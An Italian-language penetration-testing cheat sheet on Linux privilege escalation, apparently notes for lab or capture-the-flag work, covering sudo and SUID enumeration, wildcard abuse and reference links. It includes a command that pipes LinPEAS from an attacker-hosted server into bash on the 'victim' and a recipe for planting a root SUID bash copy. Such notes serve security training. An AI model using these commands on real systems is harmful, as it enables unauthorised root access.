# Privilege Escalation (Linux)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `LinPEAS`, `sudo`, `find`, `tar`, `python3` |
| **SO Target** | Linux |
| **Quando effettuare** | Dopo aver ottenuto una shell iniziale come utente non privilegiato |
| **Info Utili** | Identificazione di misconfiguration, SUID binaries e vulnerabilità del kernel |

### Analisi Iniziale
**Verifica permessi sudo:**
```bash
sudo -l
```
*Esempio:*
```bash
sudo -l
# Output: (ALL : ALL) NOPASSWD: /usr/bin/tar
```

**Verifica utenti con shell:**
```bash
cat /etc/passwd | grep sh
```

**Identificare file SUID:**
Questi file vengono eseguiti con i privilegi del proprietario (spesso root).
```bash
find /bin -perm -u=s 2>/dev/null
```
*Esempio:*
```bash
find /usr/bin -perm -u=s 2>/dev/null
```

### Strumenti Automatici (LinPEAS)
Tool fondamentale per automatizzare la ricerca di vettori di attacco.
1. Scaricare lo script sulla propria macchina.
2. Servirlo via HTTP: `python3 -m http.server 8000`.
3. Eseguire sulla vittima:
```bash
curl <ATTACKER_IP>:8000/linpeas.sh | bash
```
*Esempio:*
```bash
curl 10.10.14.176:8000/linpeas.sh | bash
```

### Vettori Comuni
**Wildcard Abuse:**
Se uno script sudo esegue comandi con `*`, è possibile iniettare parametri.

**Path Traversal:**
Se un'applicazione legge file basandosi su input utente senza sanificazione.

**SUID Bash:**
Se riesci a copiare e cambiare permessi a bash con privilegi di root:
```bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```
*Esecuzione:*
```bash
/tmp/bash -p
```

### URL Fondamentali
- [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [GTFOBins](https://gtfobins.github.io/) (Fondamentale per exploitare binari sudo/SUID)
- [Hacktricks Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
